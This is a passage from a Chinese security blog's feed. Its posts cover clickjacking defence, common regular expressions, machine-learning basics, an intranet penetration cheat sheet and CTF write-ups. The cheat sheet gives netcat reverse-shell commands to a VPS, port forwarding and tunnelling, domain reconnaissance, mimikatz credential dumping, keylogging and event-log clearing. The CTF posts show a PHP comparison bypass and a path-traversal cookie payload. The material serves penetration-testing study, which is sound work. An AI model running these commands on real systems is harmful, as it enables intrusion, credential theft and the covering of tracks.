rel="external">headers.so</a>，即在httpd.conf中去掉“LoadModule headers<em>module modules/mod</em><a href="qq://txfile/#" target="_blank" rel="external">headers.so</a>”前的#； 再.修改httpd.conf，添加下面内容：Header always append X-Frame-Options DENY 修改完如下: </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120001_486.png" alt=""></p><p>如果同一台apache服务器上有多个站点，只想针对其中一个站点进行配置，可以修改.htaccess文件，添加如下内容： Header append X-FRAME-OPTIONS “DENY” </p><p>如果是nginx，则修改nginx.conf,在server下添加下面内容： add_header X-Frame-Options “DENY”; 添加完成如下： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120001_76.png" alt=""></p><p>以上主要是针对服务端的防御，如果是客户端的话，那就是保持浏览器的及时升级更新， 最新版浏览器通常具备更好更多的安全机制保护客户的信息安全，及时升级更新浏览器，可从一定程度上进行漏洞攻击的有效防范 </p><p>另一方面，作为客户端，可以通过安装浏览器的扩展插件，达到对潜在威胁进行阻止及警告，及时判断页面中的不安全因素； 如果你使用的是Firefox，则可以安装插件NoScript，在选项中设置禁止<iframe>，效果如下： </iframe></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120002_346.png" alt=""></p><p>有了X-Frame-Options的http头差不多就是不能进行点击劫持了吧 </p><p>这里顺便分享几个关于点击劫持的PoC工具，师傅们可以玩玩： </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/enddo/CJExploiter</a> </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/sensepost/jack</a> </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/samyk/quickjack</a>     </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web漏洞挖掘之点击劫持漏洞&quot;&gt;&lt;a href=&quot;#web漏洞挖掘之点击劫持漏洞&quot; class=&quot;headerlink&quot; title=&quot;web漏洞挖掘之点击劫持漏洞&quot;&gt;&lt;/a&gt;web漏洞挖掘之点击劫持漏洞&lt;/h1&gt;&lt;h2 id=&quot;0x00-点击劫持的概念&quot;&gt;&lt;a 
      
    
    </summary>
    
      <category term="WebSecurity" scheme="http://Bigbroke.com/categories/WebSecurity/"/>
    
    
      <category term="Web漏洞" scheme="http://Bigbroke.com/tags/Web%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>20个常用的正则表达式</title>
    <link href="http://Bigbroke.com/archis/7fe4b50e/"/>
    <id>http://Bigbroke.com/archis/7fe4b50e/</id>
    <published>2018-10-09T08:29:34.000Z</published>
    <updated>2018-10-15T00:40:51.525Z</updated>
    
    <content type="html"><![CDATA[<h1 id="20个常用的正则表达式"><a href="#20个常用的正则表达式" class="headerlink" title="20个常用的正则表达式"></a>20个常用的正则表达式</h1><h2 id="1-校验密码强度"><a href="#1-校验密码强度" class="headerlink" title="1 . 校验密码强度**"></a>1 . 校验密码强度**</h2><p>密码的强度必须是包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间。</p><pre><code>^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$</code></pre><h2 id="2-校验中文"><a href="#2-校验中文" class="headerlink" title="2. 校验中文"></a><strong>2. 校验中文</strong></h2><p>字符串仅能是中文。</p><pre><code>^[\\u4e00-\\u9fa5]{0,}$</code></pre><h2 id="3-由数字、26个英文字母或下划线组成的字符串"><a href="#3-由数字、26个英文字母或下划线组成的字符串" class="headerlink" title="3. 由数字、26个英文字母或下划线组成的字符串"></a><strong>3. 由数字、26个英文字母或下划线组成的字符串</strong></h2><pre><code>^\\w+$</code></pre><h2 id="4-校验E-Mail-地址"><a href="#4-校验E-Mail-地址" class="headerlink" title="4. 校验E-Mail 地址"></a><strong>4. 校验E-Mail 地址</strong></h2><p>同密码一样，下面是E-mail地址合规性的正则检查语句。</p><pre><code>[\\w!#$%&amp;&#39;*+/=?^_`{|}~-]+(?:\\.[\\w!#$%&amp;&#39;*+/=?^_`{|}~-]+)*@(?:[\\w](?:[\\w-]*[\\w])?\\.)+[\\w](?:[\\w-]*[\\w])?</code></pre><h2 id="5-校验身份证号码"><a href="#5-校验身份证号码" class="headerlink" title="5. 校验身份证号码"></a><strong>5. 校验身份证号码</strong></h2><p>下面是身份证号码的正则校验。15 或 18位。</p><p>15位：</p><pre><code>^[1-9]\\d{7}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}$</code></pre><p>18位：</p><pre><code>^[1-9]\\d{5}[1-9]\\d{3}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}([0-9]|X)$</code></pre><h2 id="6-校验日期"><a href="#6-校验日期" class="headerlink" title="6. 校验日期"></a><strong>6. 校验日期</strong></h2><p>“yyyy-mm-dd“ 格式的日期校验，已考虑平闰年。</p><pre><code>^(?:(?!0000)[0-9]{4}-(?:(?:0[1-9]|1[0-2])-(?:0[1-9]|1[0-9]|2[0-8])|(?:0[13-9]|1[0-2])-(?:29|30)|(?:0[13578]|1[02])-31)|(?:[0-9]{2}(?:0[48]|[2468][048]|[13579][26])|(?:0[48]|[2468][048]|[13579][26])00)-02-29)$</code></pre><h2 id="7-校验金额"><a href="#7-校验金额" class="headerlink" title="7. 校验金额"></a><strong>7. 校验金额</strong></h2><p>金额校验，精确到2位小数。</p><pre><code>^[0-9]+(.[0-9]{2})?$</code></pre><h2 id="8-校验手机号"><a href="#8-校验手机号" class="headerlink" title="8. 校验手机号"></a><strong>8. 校验手机号</strong></h2><p>下面是国内 13、15、18开头的手机号正则表达式。（可根据目前国内收集号扩展前两位开头号码）</p><pre><code>^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d{8}$</code></pre><h2 id="9-判断IE的版本"><a href="#9-判断IE的版本" class="headerlink" title="9. 判断IE的版本"></a><strong>9. 判断IE的版本</strong></h2><p>IE目前还没被完全取代，很多页面还是需要做版本兼容，下面是IE版本检查的表达式。</p><pre><code>^.*MSIE [5-8](?:\\.[0-9]+)?(?!.*Trident\\/[5-9]\\.0).*$</code></pre><h2 id="10-校验IP-v4地址"><a href="#10-校验IP-v4地址" class="headerlink" title="10. 校验IP-v4地址"></a><strong>10. 校验IP-v4地址</strong></h2><p>IP4 正则语句。</p><pre><code>\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b</code></pre><h2 id="11-校验IP-v6地址"><a href="#11-校验IP-v6地址" class="headerlink" title="11. 校验IP-v6地址"></a><strong>11. 校验IP-v6地址</strong></h2><p>IP6 正则语句。</p><pre><code>(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))</code></pre><h2 id="12-检查URL的前缀"><a href="#12-检查URL的前缀" class="headerlink" title="12. 检查URL的前缀"></a><strong>12. 检查URL的前缀</strong></h2><p>应用开发中很多时候需要区分请求是HTTPS还是HTTP，通过下面的表达式可以取出一个url的前缀然后再逻辑判断。</p><pre><code>if (!s.match(/^[a-zA-Z]+:\\/\\//)){    s = &#39;http://&#39; + s;}</code></pre><h2 id="13-提取URL链接"><a href="#13-提取URL链接" class="headerlink" title="13. 提取URL链接"></a><strong>13. 提取URL链接</strong></h2><p>下面的这个表达式可以筛选出一段文本中的URL。</p><pre><code>^(f|ht){1}(tp|tps):\\/\\/([\\w-]+\\.)+[\\w-]+(\\/[\\w- ./?%&amp;=]*)?</code></pre><h2 id="14-文件路径及扩展名校验"><a href="#14-文件路径及扩展名校验" class="headerlink" title="14. 文件路径及扩展名校验"></a><strong>14. 文件路径及扩展名校验</strong></h2><p>验证windows下文件路径和扩展名（下面的例子中为.txt文件）</p><pre><code>^([a-zA-Z]\\:|\\\\)\\\\([^\\\\]+\\\\)*[^\\/:*?&quot;&lt;&gt;|]+\\.txt(l)?$</code></pre><h2 id="15-提取Color-Hex-Codes"><a href="#15-提取Color-Hex-Codes" class="headerlink" title="15. 提取Color Hex  Codes"></a><strong>15. 提取Color Hex  Codes</strong></h2><p>有时需要抽取网页中的颜色代码，可以使用下面的表达式。</p><pre><code>^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$</code></pre><h2 id="16-提取网页图片"><a href="#16-提取网页图片" class="headerlink" title="16. 提取网页图片"></a><strong>16. 提取网页图片</strong></h2><p>假若你想提取网页中所有图片信息，可以利用下面的表达式。</p><pre><code>\\&lt; *[img][^\\\\&gt;]*[src] *= *[\\&quot;\\&#39;]{0,1}([^\\&quot;\\&#39;\\ &gt;]*)</code></pre><h2 id="17-提取页面超链接"><a href="#17-提取页面超链接" class="headerlink" title="17. 提取页面超链接"></a><strong>17. 提取页面超链接</strong></h2><p>提取html中的超链接。</p><pre><code>(&lt;a\\s*(?!.*\\brel=)[^&gt;]*)(href=&quot;https?:\\/\\/)((?!(?:(?:www\\.)?&#39;.implode(&#39;|(?:www\\.)?&#39;, $follow_list).&#39;))[^&quot;]+)&quot;((?!.*\\brel=)[^&gt;]*)(?:[^&gt;]*)&gt;</code></pre><h2 id="18-查找CSS属性"><a href="#18-查找CSS属性" class="headerlink" title="18. 查找CSS属性"></a><strong>18. 查找CSS属性</strong></h2><p>通过下面的表达式，可以搜索到相匹配的CSS属性。</p><pre><code>^\\s*[a-zA-Z\\-]+\\s*[:]{1}\\s[a-zA-Z0-9\\s.#]+[;]{1}</code></pre><h2 id="19-抽取注释"><a href="#19-抽取注释" class="headerlink" title="19. 抽取注释"></a><strong>19. 抽取注释</strong></h2><p>如果你需要移除HMTL中的注释，可以使用如下的表达式。</p><pre><code>&lt;!--(.*?)--&gt;</code></pre><h2 id="20-匹配HTML标签"><a href="#20-匹配HTML标签" class="headerlink" title="20. 匹配HTML标签"></a><strong>20. 匹配HTML标签</strong></h2><p>通过下面的表达式可以匹配出HTML中的标签属性。</p><pre><code class="regex">&lt;\\/?\\w+((\\s+\\w+(\\s*=\\s*(?:&quot;.*?&quot;|&#39;.*?&#39;|[\\^&#39;&quot;&gt;\\s]+))?)+\\s*|\\s*)\\/?&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;20个常用的正则表达式&quot;&gt;&lt;a href=&quot;#20个常用的正则表达式&quot; class=&quot;headerlink&quot; title=&quot;20个常用的正则表达式&quot;&gt;&lt;/a&gt;20个常用的正则表达式&lt;/h1&gt;&lt;h2 id=&quot;1-校验密码强度&quot;&gt;&lt;a href=&quot;#1-校验密码强度&quot;
      
    
    </summary>
    
      <category term="Language" scheme="http://Bigbroke.com/categories/Language/"/>
    
    
      <category term="正则" scheme="http://Bigbroke.com/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>机器学习概念</title>
    <link href="http://Bigbroke.com/archis/d4eed376/"/>
    <id>http://Bigbroke.com/archis/d4eed376/</id>
    <published>2018-10-09T08:29:01.000Z</published>
    <updated>2018-10-15T00:40:51.608Z</updated>
    
    <content type="html"><![CDATA[<h1 id="机器学习概念"><a href="#机器学习概念" class="headerlink" title="机器学习概念"></a>机器学习概念</h1><h2 id="什么是机器学习"><a href="#什么是机器学习" class="headerlink" title="什么是机器学习"></a>什么是机器学习</h2><p>我们通常在计算机编程的时候，都是已知输入，然后通过一定的算法产生输出，如下图所示：</p><p><a href="http://blog.laiyum.site/uploads/18052801.jpg" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052801.jpg" alt="image"></a></p><p>而还有一种情况呢，我们知道了输入和输出，但是却不知道中间的算法，这时候就需要用机器学习通过观察输入输出来学习这个算法，我们叫做知识，然后用学到的知识通过新的输入来产生输出。简而言之<strong>机器学习是用来寻找输入输出间的映射关系的</strong><br><a href="http://blog.laiyum.site/uploads/18052802.jpg" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052802.jpg" alt="image"></a></p><p>其实我们人在学习思考时，脑子里也有这么个映射过程，当我们看到猫的图片，在脑子里产生了映射，于是乎，就说出了猫这个词，所以呢<strong>机器学习就是让计算机和人一样思考</strong></p><p><a href="http://blog.laiyum.site/uploads/18052803.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052803.png" alt="image"></a></p><h2 id="机器学习相关概念的区别"><a href="#机器学习相关概念的区别" class="headerlink" title="机器学习相关概念的区别"></a>机器学习相关概念的区别</h2><p>在谈到机器学习时，我们经常会听到下面几个概念：数据挖掘，人工智能等等，那他们之间有什么联系呢？我们先来看看下面的这幅图：</p><p><a href="http://blog.laiyum.site/uploads/18052808.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052808.png" alt="image"></a></p><p>也就是说机器学习是数据挖掘它们的底层，机器学习给它们提供算法，数据挖掘则是机器学习的应用。</p><h2 id="机器学习的应用"><a href="#机器学习的应用" class="headerlink" title="机器学习的应用"></a>机器学习的应用</h2><p>像我们熟知的Apple的faceID，google的AlphaGo，MicroSoft的小娜都是机器学习的典型应用</p><h2 id="机器学习方法"><a href="#机器学习方法" class="headerlink" title="机器学习方法"></a>机器学习方法</h2><p>实现机器学习有多种方法，这里方法是我们通常所说的算法，主要有下面几种：</p><h3 id="监督学习方法"><a href="#监督学习方法" class="headerlink" title="监督学习方法"></a>监督学习方法</h3><p>所谓监督学习方法就是说随便给一堆数据和数据对应的标签，计算机在学习之后能根据新的输入数据判断它们对应的标签。</p><p>举个例子，我们给计算机一大堆猫狗的图片，并告诉它，哪些是狗，哪些是猫，计算机学习之后，再给它看猫和狗的图片，它就能告诉我们哪些是狗，哪些是猫。</p><p><a href="http://blog.laiyum.site/uploads/18052804.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052804.png" alt="image"></a></p><p><a href="http://blog.laiyum.site/uploads/18052805.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052805.png" alt="image"></a></p><p>监督学习方法用于分类和回归，我们熟知的神经网络就是一种监督学习方法。</p><h3 id="非监督学习方法"><a href="#非监督学习方法" class="headerlink" title="非监督学习方法"></a>非监督学习方法</h3><p>我们有的时候只给计算机数据，不给计算机对应的标签，计算机能通过观察数据之间的规率进行数据归类<br>还是上面的例子，我们这次不告诉计算机哪些是狗，哪些是猫，计算机学习之后能把他们归类出来。</p><p><a href="http://blog.laiyum.site/uploads/18052806.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052806.png" alt="image"></a></p><p>非监督学习用于聚类，如k-means算法</p><h3 id="半监督学习方法"><a href="#半监督学习方法" class="headerlink" title="半监督学习方法"></a>半监督学习方法</h3><p>半监督学习方法综合了监督学习和非监督学习两种方法。在初始阶段给计算机一些有标签的数据和大量没有标签的数据，计算机学习后能进行归类<br>半监督学习用于训练更高效更准确的模型，因为它既避免了带标签的数据少而的模型过拟合，也减少了打标签的工作量。</p><h3 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h3><p>强化学习是学习一个最优策略，可以让本体在特定环境中，根据当前的状态，做出行动，从而获得最大奖励。</p><p>来个新例子，这次，我们让计算机打篮球，我们并不需要告诉计算机怎么打篮球，我们只需要给它个篮球，让它自己打，然后我们对计算机打分，进球分越高，打分越高，这里的打分就是上面的奖励，每次计算机要做的就是获得最大奖励，一开始，面对陌生的环境，计算机并不知道怎么进球，经过奖励刺激后，命中率就会越来越高。</p><p><a href="http://blog.laiyum.site/uploads/18052807.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052807.png" alt="image"></a></p><p>google的AlphaZero便是强化学习的典型应用</p><h3 id="遗传算法"><a href="#遗传算法" class="headerlink" title="遗传算法"></a>遗传算法</h3><p>模拟自然界优胜劣汰的进化现象，把搜索空间（问题解的组成空间）映射为遗传空间，把可能的解编码成一个向量——染色体，向量的每个元素称为基因。通过不断计算各染色体的适应值，选择最好的染色体，获得最优解。</p><p>还是拿上面的例子来说，先训练出两个打篮球的计算机ai，让这两个aic重组，变异产生后代种群，挑出最会打篮球的再进行重组变异，如此循环，每次挑出最强的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;机器学习概念&quot;&gt;&lt;a href=&quot;#机器学习概念&quot; class=&quot;headerlink&quot; title=&quot;机器学习概念&quot;&gt;&lt;/a&gt;机器学习概念&lt;/h1&gt;&lt;h2 id=&quot;什么是机器学习&quot;&gt;&lt;a href=&quot;#什么是机器学习&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="AiSecurity" scheme="http://Bigbroke.com/categories/AiSecurity/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈内网渗透流程</title>
    <link href="http://Bigbroke.com/archis/17ef10d7/"/>
    <id>http://Bigbroke.com/archis/17ef10d7/</id>
    <published>2018-10-09T02:50:44.000Z</published>
    <updated>2018-12-07T17:19:49.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅谈内网渗透流程"><a href="#浅谈内网渗透流程" class="headerlink" title="浅谈内网渗透流程"></a>浅谈内网渗透流程</h1><h2 id="0x01-内网转发"><a href="#0x01-内网转发" class="headerlink" title="0x01 内网转发"></a>0x01 内网转发</h2><h3 id="lcx-内网端口转发"><a href="#lcx-内网端口转发" class="headerlink" title="lcx 内网端口转发"></a>lcx 内网端口转发</h3><p>Lcx内网端口转发<br>• lcx.exe -slave vps 3333 127.0.0.1 3389 //把主机的3389端口转发到vps的3333端口<br>• lcx.exe –listen 3333 4444 //监听3333端口，并将3333的请求转发给4444端口</p><p>本地端口转发<br>• Lcx.exe –tran 21 主机IP 3389 //将3389端口转发到21端口</p><p>通常时候内网的防火墙把3389端口ban了，无法作为端口转发出去，这个时候应该吧端口转发成21或者80端口，这些端口是有放行策略的，</p><h3 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h3><ul><li>Earthworm </li><li>Termite  //ew升级版 <a href="http://rootkiter.com/Termite/" target="_blank" rel="external">http://rootkiter.com/Termite/</a></li></ul><p>客户端执行：</p><pre><code>agent_windows_x86.exe -l  4444</code></pre><p>管理端执行：</p><pre><code>admin_windows_x86.exe -c 127.0.0.1 -p 4444</code></pre><p>将新的agent加入拓扑：</p><pre><code>agent_windows_x86.exe -c 127.0.0.1 -p 4444</code></pre><p>具体使用方法可参考： <a href="http://rootkiter.com/Termite/README.txt" target="_blank" rel="external">http://rootkiter.com/Termite/README.txt</a></p><ul><li><p>S5.py  //配合Proxifier一起使用</p></li><li><p>reGeorg //通过webshell 建立一个 socks 代理进行内网穿透</p><p>  s</p></li></ul><h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><p>反向连接<br>• nc -lvp 4444 //vps上执行<br>• nc -t -e cmd.exe vps 4444 //-t 参数是指通过telnet模式执行cmd.exe<br> 正向代理<br>• nc -l -p 4444 -t -e cmd.exe //vps上<br>• nc -vv vps 4444 //本地执行</p><h3 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p><p>工具地址： <a href="https://github.com/fatedier/frp" target="_blank" rel="external">https://github.com/fatedier/frp</a></p><p><strong>frp 的作用</strong></p><p>利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。</p><p>对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</p><p>利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</p><p>启动frp服务器端：</p><pre><code>frps.exe -c frps.ini</code></pre><p>浏览器访问： 127.0.0.1：7500，输入frps.ini中配置的用户名和密码即可进入控制面板： </p><h3 id="ngrok"><a href="#ngrok" class="headerlink" title="ngrok"></a>ngrok</h3><p>这里仅简单演示下Windows平台上的使用：</p><p>首先在内网主机上执行（内网主机需安装Python）：</p><pre><code>python -m SimpleHTTPServer 8089</code></pre><p>我这里在Windows下用Python 2.7来演示，就执行：</p><pre><code>py -2 -m SimpleHTTPServer 8089</code></pre><p><a href="https://s9.postimg.cc/cghz3gapb/360_20180502231649460.jpg" target="_blank" rel="external"><img src="https://s9.postimg.cc/cghz3gapb/360_20180502231649460.jpg" alt="内网渗透之端口转发与代理"></a></p><p>将ngrok上传至内网主机并启动ngrok：</p><pre><code>ngrok.exe http 8089</code></pre><p><a href="https://s9.postimg.cc/7j4ei1ixb/360_20180502232222200.jpg" target="_blank" rel="external"><img src="https://s9.postimg.cc/7j4ei1ixb/360_20180502232222200.jpg" alt="内网渗透之端口转发与代理"></a></p><p>这时我们只需要在浏览器中访问：</p><pre><code>http://cdb0e21b.ngrok.io或者https://cdb0e21b.ngrok.io</code></pre><p>即可通过HTTP或者HTTPS来访问内网主机上的文件。</p><p>当然ngrok还有很多其他功能，更多使用方法请参考官方文档： <a href="https://ngrok.com/docs" target="_blank" rel="external">https://ngrok.com/docs</a></p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><h3 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h3><p>query user || qwinsta 查看当前在线用户</p><p>net user  查看本机用户</p><p>net user /domain 查看域用户</p><p>net view &amp; net group “domain computers” /domain 查看当前域计算机列表 第二个查的更多</p><p>net view /domain 查看有几个域</p><p>net view \\dc   查看 dc 域内共享文件</p><p>net group /domain 查看域里面的组</p><p>net group “domain admins” /domain 查看域管</p><p>net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管</p><p>net group “domain controllers” /domain 域控</p><p>net time /domain </p><p>net config workstation   当前登录域 - 计算机名 - 用户名</p><p>net use \\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源</p><p>ipconfig</p><p>systeminfo</p><p>tasklist /svc</p><p>tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</p><p>net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</p><p>netstat -ano</p><p>nltest /dclist:xx  查看域控</p><p>whoami /all 查看 Mandatory Label uac 级别和 sid 号</p><p>net sessoin 查看远程连接 session (需要管理权限)</p><p>net share     共享目录</p><p>cmdkey /l   查看保存登陆凭证</p><p>echo %logonserver%  查看登陆域</p><p>spn –l administrator spn 记录</p><p>set  环境变量</p><p>dsquery server - 查找目录中的 AD DC/LDS 实例</p><p>dsquery user - 查找目录中的用户</p><p>dsquery computer 查询所有计算机名称 windows 2003</p><p>dir /s *.exe 查找指定目录下及子目录下没隐藏文件</p><p>arp -a</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Windows密码 //收集管理员信息</p><p>mimikatz.exe </p><p>privilege::debug</p><p>sekurlsa::logonpasswords</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806221754_957.png" alt=""></p><p>破解lm密码使用：<a href="http://www/object_security.ch/en/opcrack.php" target="_blank" rel="external">http://www/object_security.ch/en/opcrack.php</a></p><p> token::elevate</p><p> lsadump::sam</p><p> lsadump::secrets </p><p>exit </p><p> wifi 密码： </p><p>• Mysql等数据库密码 </p><p>• 浏览器保存密码</p><p> • 浏览器历史记录</p><p> • 远程桌面历史记录</p><p> • 查找文件</p><p> • 键盘记录</p><p>keyscan_start</p><p>keyscan_dump</p><p> • 中间人</p><h2 id="0x03-横向移动"><a href="#0x03-横向移动" class="headerlink" title="0x03 横向移动"></a>0x03 横向移动</h2><p> • 端口扫描</p><p> • 命令执行</p><p> • SQL注入</p><p> • 文件上传 </p><p>• 密码爆破</p><p> • 各类CVE </p><h2 id="0x04-收尾工程"><a href="#0x04-收尾工程" class="headerlink" title="0x04 收尾工程"></a>0x04 收尾工程</h2><p>痕迹清理 </p><p>系统日志 //%systemroot%system32configSecEvent.EVT<br>• 应用程序日志 //%systemroot%system32configAppEvent.EVT<br>• FTP日志 //%systemroot%system32logfilesmsftpsvc1<br>• WWW日志 //%systemroot%system32logfilesw3svc1</p><p>参考文章</p><p><a href="http://www.freebuf.com/articles/web/170970.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/170970.html</a></p><p><a href="https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw" target="_blank" rel="external">https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw</a></p><p><a href="https://www.anquanke.com/post/id/92646" target="_blank" rel="external">https://www.anquanke.com/post/id/92646</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;浅谈内网渗透流程&quot;&gt;&lt;a href=&quot;#浅谈内网渗透流程&quot; class=&quot;headerlink&quot; title=&quot;浅谈内网渗透流程&quot;&gt;&lt;/a&gt;浅谈内网渗透流程&lt;/h1&gt;&lt;h2 id=&quot;0x01-内网转发&quot;&gt;&lt;a href=&quot;#0x01-内网转发&quot; class=&quot;he
      
    
    </summary>
    
      <category term="内网" scheme="http://Bigbroke.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="内网" scheme="http://Bigbroke.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>安恒5月</title>
    <link href="http://Bigbroke.com/archis/18042369/"/>
    <id>http://Bigbroke.com/archis/18042369/</id>
    <published>2018-08-25T12:40:51.000Z</published>
    <updated>2018-11-02T13:52:17.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>题目</p><pre><code>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。</code></pre><p>题目给了代码</p><pre><code>&lt;?php highlight_file(__FILE__); ini_set(&quot;display_error&quot;, false);  error_reporting(0);  $str = isset($_GET[&#39;A_A&#39;])?$_GET[&#39;A_A&#39;]:&#39;A_A&#39;; if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false) {     echo &#39;A_A,have fun&#39;; } elseif ($str&lt;9999999999) {     echo &#39;A_A,too small&#39;; } elseif ((string)$str&gt;0) {     echo &#39;A_A,too big&#39;; } else{     echo file_get_contents(&#39;flag.php&#39;); } ?&gt;</code></pre><p>首先第一个if判断，可以用<code>urlencode</code>绕过</p><p>然后我们需要知道php中的这样一个特性</p><pre><code>php &gt; var_dump([]&gt;9999999999);bool(true)php &gt; var_dump((string)[]&gt;0);bool(false)</code></pre><p>在php中，数组<code>[]</code>大于任何一个数</p><p>这样就可以成功绕过验证了</p><p><code>php -r &quot;var_dump([]&gt;233333333);&quot;</code></p><p>true</p><p><a href="http://101.71.29.5:10007/?A+A[]=admin" target="_blank" rel="external">http://101.71.29.5:10007/?A+A[]=admin</a></p><p>这里有个坑，flag被注释了，需要查看源代码才能看得到flag</p><pre><code>flag={09bc24026c987ae44a6e424479b2e3}</code></pre><h2 id="Mynote"><a href="#Mynote" class="headerlink" title="Mynote"></a>Mynote</h2><p>这道题目一开始我死扣xss发现无路可循后面经别人小小提醒之后，原来是个炒鸡弱智的反序列化题目，不多说<br>上图，在<code>robots.txt</code>里面发现几个可疑的页面，可能有用先记录着，直接访问<code>flag.php</code>是个假的flag。</p><p>经过别人的提示，是反序列化以后，多抓几个包看一下  在<code>upload页面</code>上传图片文件，然后返回查看图片的页面发现里面多了一个关于<code>picture</code>参数的<code>cookie</code> </p><p>解码发现是个<code>json格式</code>的东西 </p><p>这就跟反序列化联系起来了，这是一个数组类型的反序列化但直接反序列化会有报错，如下<br><img src="https://s1.ax1x.com/2018/06/23/P9MK5F.png" alt="P9MK5F.png"><br>发现是在当前目录用的函数读取页面，于是就要目录穿越一波，于是便有了下面的操作</p><pre><code class="php">&lt;?php $a[] = &#39;../../controllers/Basecontrol.php&#39;; $b[] = &#39;../../flag.php&#39;; $c[] = &#39;../../controllers/User.php&#39;; $d[] = &#39;../../controllers/Controllers.php.php&#39;;echo urlencode(base64_encode(serialize($a)));12345678</code></pre><p>把他们一个个弄到<code>picture</code>的<code>cookie</code>里面，把回显出来的<code>base64编码</code>一遍遍解码，得到源码，起初一直以为后续还要代码审计。。。结果解码flag.php的源码的时候出现了真的<code>flag</code>。。。。。尼玛坑爹，都做好审计准备了</p><pre><code class="php">&lt;?php$flag = &quot;flag{N4me_sPac4_Is_Int3r3st1ng}&quot;;echo &quot;flag{This_1S_A_F4ke_f1aG}&quot;;1234</code></pre><h2 